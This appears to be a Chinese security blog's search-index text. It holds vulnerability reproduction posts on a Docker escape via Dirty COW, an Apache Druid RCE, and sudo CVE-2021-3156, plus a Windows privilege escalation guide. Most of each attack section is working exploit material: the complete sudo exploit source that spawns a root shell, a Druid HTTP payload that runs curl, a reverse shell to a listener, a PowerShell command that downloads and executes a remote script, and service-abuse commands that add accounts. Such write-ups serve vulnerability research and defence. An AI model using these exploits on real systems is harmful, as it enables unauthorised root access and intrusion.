Successfully got the file handle [+] Successfully got write handle \u0026{0xc8201231e0} 假设，管理员通过 exec 进入容器，从而触发 Payload。 docker exec -it cafa20cfb0f9 /bin/sh 在 172.19.0.1 上监听本地端口，成功获取宿主机反弹回来的shell。 3.4.2 CVE-2019-14271 https://xz.aliyun.com/t/6806 ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:3:4","tags":["云原生安全","Docker"],"title":"Docker 逃逸相关总结","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["云原生安全"],"content":"3.5 内核漏洞 Dirty Cow（CVE-2016-5195）是 Linux 内核中的权限提升漏洞，通过它可实现 Docker 容器逃逸，获得 root 权限的 shell。 环境准备： docker 与宿主机共享内核，因此我们需要存在 dirtyCow 漏洞的宿主机镜像。 添加容器下载并运行： git clone https://github.com/gebl/dirtycow-docker-vdso.git cd dirtycow-docker-vdso/ sudo docker-compose run dirtycow /bin/bash **漏洞利用：**进入容器，编译 POC 并执行 cd /dirtycow-vdso/ make ./0xdeadbeef 172.19.0.1:4444 在 172.19.0.1 监听本地端口，成功接收到宿主机反弹的 shell。 ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:3:5","tags":["云原生安全","Docker"],"title":"Docker 逃逸相关总结","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["漏洞复现"],"content":"CVE-2021-25646：Apache Druid RCE复现","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["Druid","漏洞复现"],"title":"CVE-2021-25646 - Apache Druid RCE 复现","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"Apache Druid RCE 复现 ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["Druid","漏洞复现"],"title":"CVE-2021-25646 - Apache Druid RCE 复现","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"1 漏洞介绍 ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["Druid","漏洞复现"],"title":"CVE-2021-25646 - Apache Druid RCE 复现","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"1.1 Druid Druid 是一个 JDBC 组件，支持所有 JDBC 兼容的数据库，包括 Oracle、MySql、Derby、Postgresql、SQL Server、H2 等。 ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:1","tags":["Druid","漏洞复现"],"title":"CVE-2021-25646 - Apache Druid RCE 复现","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"1.2 漏洞描述 编号：CVE-2021-25646 Apache Druid 包括执行用户提供的 JavaScript 的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在 Druid 0.20.0 及更低版本中，经过身份验证的用户可以构造传入的 json 串来控制一些敏感的参数发送恶意请求，利用 Apache Druid 漏洞可以执行任意代码。 ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:2","tags":["Druid","漏洞复现"],"title":"CVE-2021-25646 - Apache Druid RCE 复现","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"1.3 影响版本 Apache Druid \u003c 0.20.1 ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:3","tags":["Druid","漏洞复现"],"title":"CVE-2021-25646 - Apache Druid RCE 复现","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"2 漏洞复现 ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["Druid","漏洞复现"],"title":"CVE-2021-25646 - Apache Druid RCE 复现","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"2.1 环境搭建 从 docker 仓库中拉取一个版本为 0.16.0 的镜像： docker pull fokkodriesprong/docker-druid docker run --rm -i -p 8888:8888 fokkodriesprong/docker-druid ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:1","tags":["Druid","漏洞复现"],"title":"CVE-2021-25646 - Apache Druid RCE 复现","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"2.2 复现 docker 容器启动后，访问 8888端口： 点击 Load data -\u003e Local Disk： 填入 Base directory: quickstart/tutorial/ File filter: wikiticker-2015-09-12-sampled.json.gz 一直点击 next 到 filter 项 抓包修改 filter 为： { \"type\":\"javascript\", \"function\":\"function(value){return java.lang.Runtime.getRuntime().exec('curl dnslog')}\", \"dimension\":\"added\", \"\":{ \"enabled\":\"true\" } } 也可以直接使用 POC： POST /druid/indexer/v1/sampler HTTP/1.1 Host: xxx.xxx.xxx.xxx:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/json Content-Length: 995 Connection: close {\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", \"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, \"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, \"dataSchema\": {\"dataSource\": \"sample\", \"timestampSpec\": {\"column\": \"timestamp\", \"format\": \"iso\"}, \"dimensionsSpec\": {}, \"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", \"dimension\": \"added\", \"function\": \"function(value) {java.lang.Runtime.getRuntime().exec('curl xxxxx.dnslog.cn')}\", \"\": {\"enabled\": true}}}}, \"type\": \"index\", \"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}} ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:2","tags":["Druid","漏洞复现"],"title":"CVE-2021-25646 - Apache Druid RCE 复现","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"2.3 修复 升级 Apache Druid 到最新的版本 对 Apache Druid 进行权限控制，只允许受信任的主机访问集群服务器 ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:3","tags":["Druid","漏洞复现"],"title":"CVE-2021-25646 - Apache Druid RCE 复现","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"CVE-2021-3156 sudo 提权漏洞复现","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["sudo","漏洞复现"],"title":"CVE-2021-3156 sudo 提权漏洞复现","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"CVE-2021-3156 sudo 提权漏洞复现 ","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["sudo","漏洞复现"],"title":"CVE-2021-3156 sudo 提权漏洞复现","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"1 漏洞介绍 ","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["sudo","漏洞复现"],"title":"CVE-2021-3156 sudo 提权漏洞复现","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"1.1 原理 一个类 Unix 操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。 当 sudo 通过 -s 或 -i 命令行选项在 shell 模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用 -s 或 -i 标志运行 sudoedit 时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在 sudoers 文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用 sudo 获得系统 root 权限。 ","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:1","tags":["sudo","漏洞复现"],"title":"CVE-2021-3156 sudo 提权漏洞复现","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"1.2 影响版本 Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1 ","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:2","tags":["sudo","漏洞复现"],"title":"CVE-2021-3156 sudo 提权漏洞复现","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"2 复现 ","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["sudo","漏洞复现"],"title":"CVE-2021-3156 sudo 提权漏洞复现","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"2.1 快速判断漏洞方法 以非 root 用户登录系统，并使用命令 sudoedit -s / 如果响应一个以 sudoedit: 开头的报错，那么表明存在漏洞。 如果响应一个以 usage: 开头的报错，那么表明补丁已经生效。 ","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:1","tags":["sudo","漏洞复现"],"title":"CVE-2021-3156 sudo 提权漏洞复现","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"2.2 编译运行 一共三个文件： hax.c // Tested on: // Ubunutu 20.0.4.1 LTS // Sudo version 1.8.31 // Sudoers policy plugin version 1.8.31 // Sudoers file grammar version 46 // Sudoers I/O plugin version 1.8.31 #include \u003cstdio.h\u003e#include \u003cstring.h\u003e#include \u003cstdlib.h\u003e#include \u003cstdint.h\u003e#include \u003cunistd.h\u003e#include \u003cctype.h\u003e #define SUDOEDIT_PATH \"/usr/bin/sudoedit\" int main(int argc, char *argv[]) { // CTF quality exploit below. char *s_argv[]={ \"sudoedit\", \"-u\", \"root\", \"-s\", \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\\\\", \"\\\\\", \"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB123456\\\\\", NULL }; char *s_envp[]={ \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"\\\\\", \"X/P0P_SH3LLZ_\", \"\\\\\", \"LC_MESSAGES=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\", \"LC_ALL=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\", \"LC_CTYPE=C.UTF-8@AAAAAAAAAAAAAA\", NULL }; printf(\"**** CVE-2021-3156 PoC\\n\"); execve(SUDOEDIT_PATH, s_argv, s_envp); return 0; } lib.c #include \u003cunistd.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e static void __attribute__ ((constructor)) _init(void); static void _init(void) { printf(\"[+] bl1ng bl1ng! We got it!\\n\"); setuid(0); seteuid(0); setgid(0); setegid(0); static char *a_argv[] = { \"sh\", NULL }; static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL }; execv(\"/bin/sh\", a_argv); } Makefile： all: rm -rf libnss_X mkdir libnss_X gcc -o sudo-hax-me-a-sandwich hax.c gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c clean: rm -rf libnss_X sudo-hax-me-a-sandwich 编译： tar -zxvf CVE-2021-3156.tar.gz cd CVE-2021-3156 make 直接执行：./sudo-hax-me-a-sandwich 即可。 ","date":"2021-01-30","objectID":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:2","tags":["sudo","漏洞复现"],"title":"CVE-2021-3156 sudo 提权漏洞复现","uri":"/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试","提权"],"content":"Windows 提权方式总结","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"Windows 提权方式总结 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:0:0","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"1 前言 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:1:0","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"1.1 提权基础命令 # 查询系统信息 systeminfo # 如果要查看特定的信息，可以使用 systeminfo | findstr /B /C:\"OS名称\" /C:\"OS版本\" # 主机名 Hostname # 环境变量 Set # 查看用户信息 Net user # 查看服务 pid 号 tasklist /svc|find \"TermService\" netstat -ano|find \"3389\" # 查看系统名 wmic os get caption # 查看补丁信息 wmic qfe get Description,HotFixID,InstalledOn # 如果要定位到特定的补丁可以使用如下命令 wmic qfe get Description,HotFixID,InstalledOn | findstr /C:\"KB4346084\" /C:\"KB4509094\" # 查看当前安装程序 wmic product get name,version 其中需要注意一下 环境变量，因为有的软件环境变量可能设置在其它路径中，而在该路径下的文件是具有写权限的，就可以通过替换文件来达到提权操作 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:1:1","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"1.2 Windows 权限划分 User：普通用户权限，系统中最安全的权限，分配给该组的默认权限不允许成员修改操作系统的设置或用户资料 Administrator：管理员权限，可以利用 Windows 的机制将自己提升为 System 权限，以便操作 SAM 文件等 System：系统权限，可以对 SAM 等敏感文件进行读取，往往需要 Administrator 权限提升到 System 权限才可以对散列值进行 Dump 操作 TrustedInstaller：最高权限， 对于系统文件，即使 System 权限也无法进行修改，只有 TrustedInstaller 权限才可以修改文件 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:1:2","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"1.3 常见 webshell 所处的权限 通常的 webshell 权限如下： ASP、PHP - 匿名权限 ASPX - user 权限 JSP - 通常是系统权限 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:1:3","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"2 系统内核提权 此提权方法即是通过系统本身存在的一些漏洞，未曾打相应的补丁而暴露出来的提权方法，依托可以提升权限的 EXP 和它们的补丁编号，进行提升权限。 检查： systeminfo wmic qfe get Caption,Description,HotFixID,InstalledOn # msf post/windows/gather/enum_patches Windows-Exploit-Suggester 下面是辅助提权的页面： https://github.com/SecWiki/windows-kernel-exploits https://wiki.0-sec.org/#/index https://github.com/neargle/win-powerup-exp-index http://blog.neargle.com/win-powerup-exp-index/ https://detect.secwx.com ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:2:0","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"3 配置不当提权 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:3:0","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"3.1 系统服务权限配置错误 Windows 系统服务文件在操作系统启动时加载并执行，并调用可执行文件。因此，如果一个低权限用户对这些调用的可执行文件拥有可写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限，但一般情况下，Windows 是以 System 权限执行的，因此，其文件夹、文件和注册表键值都是受到强访问控制机制保护的，但在某些情况下仍有些服务没有得到有效保护。 3.1.1 accesschk 下载地址：https://download.sysinternals.com/files/SysinternalsSuite.zip 用 accesschk.exe 工具查看当前用户可修改的服务： accesschk.exe -uwcqv \"XXX\" * /accepteula \u003e 1.txt //XXX为当前用户名 如果出现 SERVICE_ALL_ACCESS 则表示当前用户拥有修改该服务的权限 查看该服务启动时的权限 sc qc VMTools 然后修改执行文件路径为我们想要执行的命令 # 注意这里的\"=\"后面要留有空格 sc config VMTools binPath= \"net user test1 abc123! /add\" # 查看查询该服务的执行路径是否修改成功 sc qc VMTools 重启服务 sc stop VMTools sc start VMTools 但要注意这里启动时会报错，因为当一个服务在 Windows 系统中启动后，它必须和服务控制管理器通信。如果没有通信，服务控制管理器会认为出现了错误，并会终止这个进程。但是我们的命令已经以 SYSTEM 权限运行了，并且成功添加了一个用户。 信息 利用系统自带的 icacls 也可以： 确定写入权限：icacls \"C:\\Program Files\\program folder\" 「M」表示修改、「F」表示完全控制 「CI」代表从属容器将继承访问控制项 「OI」代表从属文件将继承访问控制项 常用命令： icacls \"C:\\Program Files\\*\" 2\u003enul | findstr \"(M)\" | findstr \"Everyone\" icacls \"C:\\Program Files(x86)\\*\" 2\u003enul | findstr \"(M)\" | findstr \"Everyone\" icacls \"C:\\Program Files\\*\" 2\u003enul | findstr \"(M)\" | findstr \"BUILTIN\\Users\" icacls \"C:\\Program Files(x86)\\*\" 2\u003enul | findstr \"(M)\" | findstr \"BUILTIN\\Users\" 3.1.2 PowerSploit powershell.exe -exec bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks\" powershell.exe -exec bypass -Command \"\u0026 {Import-Module D:/PowerUp.ps1; Invoke-AllChecks}\" \u003e 1.txt 列出了所有可能存在问题的服务： ServiceName：可能存在漏洞的服务 Path：该服务的可执行程序的路径 StartName：服务运行账号 AbuseFunction：利用方式 根据 AbuseFunction 中的利用方式执行脚本，这里以 VGAuthService 服务为例 添加一个名为 user，密码为 123456 的账号： powershell.exe -exec bypass -Command \"\u0026 {Import-Module C:/PowerUp.ps1;Invoke-ServiceAbuse -Name 'VGAuthService' -Username user -Password 123456}\" 3.1.3 metasploit use exploit/windows/local/service_permissions set AGGRESSIVE true set session 1 exploit ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:3:1","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"3.2 可信任服务路径提权 可信任服务路径漏洞利用了 Windows 文件路径解析的特性，如果一个服务调用的可执行文件没有正确地处理所引用的完整路径名，同时攻击者该文件路径有可写权限，攻击者就可以上传文件来劫持路径名。 例如 Windows 系统启动某服务时查找的文件路径为 C:\\Program Files\\Some Folder\\Services.exe。 对于该路径中的每一个空格，Windows 都会尝试并执行与空格前面的名字相匹配的程序，因此 Windows 会以依次如下顺序查找一下启动程序： C:\\Program.exe C:\\Program Files\\Some.exe C:\\Program Files\\Some Folder\\Services.exe 此时如果我们对 C:\\路径或者 C:\\Program Files 有可写的权限，就可以上传 Program.exe 或 Some.exe 程序到相应目录下，当服务重新启动时，就会以 System 权限执行我们上传的恶意程序。 利用条件： 服务路径未使用双引号 服务路径包含空格 我们有某一中间文件夹的写权限 3.2.1 检查 wmic service get name,displayname,pathname,startmode|findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\" |findstr/i /v \"\"\" 3.2.2 利用 接着查看是否有对目标文件夹的写权限，使用 Windows 内置工具 icacls，以此检查各级路径： icacls \"C:\" icacls \"C:\\Program Files\" icacls \"C:\\Program Files\\VMware\" 依次查看各级目录是否有可写权限，最后找到 C:\\Program Files\\VMware 目录，在该目录下方式木马，上线后，即为高权限。 3.3.3 msf 中的模块 exploit/windows/local/trusted_service_path 模块 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:3:2","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"3.3 计划任务提权 如果攻击者对以高权限运行的计划任务所在目录具有所写权限，就可以使用恶意程序覆盖原来的程序，这样，在计划任务下次执行时就会以高权限来运行恶意程序。 Get-ScheduledTask | Select * | ? {($_.TaskPath -notlike \"\\Microsoft\\Windows\\*\") -And ($_.Principal.UserId -notlike \"*$env:UserName*\")} | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @{Name=\"User\";Expression={$_.Principal.userID}} 查看某个目录的权限配置情况 accesschk64.exe -dqv \"/path/to/dir\" 如果攻击者对某个高权限的计划任务所在的路径有可写权限，可使用恶意程序覆盖原来的程序，当计划任务下次执行时，就会以高权限运行恶意程序。 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:3:3","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"4 AlwaysInstallElevated 提权 注册表键 AlwaysInstallElevated 是一个策略设置项，Window 允许低权限用户以 System 权限运行 MSI 安装文件，如果启用此策略设置项，那么任何权限的用户都能以 NT AUTHORITY\\SYSTEM 权限来运行恶意的 MSI 文件 